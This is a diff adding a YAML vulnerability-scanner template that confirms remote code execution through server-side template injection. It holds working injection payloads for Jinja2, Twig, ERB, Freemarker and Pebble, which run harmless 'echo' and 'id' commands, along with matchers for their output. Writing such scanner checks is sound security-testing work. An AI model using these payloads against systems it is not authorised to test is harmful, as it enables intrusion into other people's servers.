@@ -1,0 +1,29 @@
+id: ssti-rce
+info:
+  name: "SSTI - RCE Exploitation"
+  severity: critical
+  description: "Confirms RCE via server-side template injection with command execution payloads"
+  tags: [ssti, injection, rce, template]
+  author: Wired
+
+inject: query_params
+detection: pattern
+
+payloads:
+  # Jinja2 (Python)
+  - "{{config.__class__.__init__.__globals__['os'].popen('echo akemi_ssti_rce').read()}}"
+  - "{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}"
+  # Twig (PHP)
+  - "{{['id']|filter('system')}}"
+  # ERB (Ruby)
+  - "<%= `echo akemi_ssti_rce` %>"
+  - "<%= system('echo akemi_ssti_rce') %>"
+  # Freemarker (Java)
+  - '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("echo akemi_ssti_rce")}'
+  # Pebble (Java)
+  - '{% set cmd = "echo akemi_ssti_rce"%}{% set out = cmd.execute() %}{{out}}'
+
+matchers:
+  body_patterns:
+    - "akemi_ssti_rce"
+    - "uid=[0-9]+.*gid=[0-9]+"
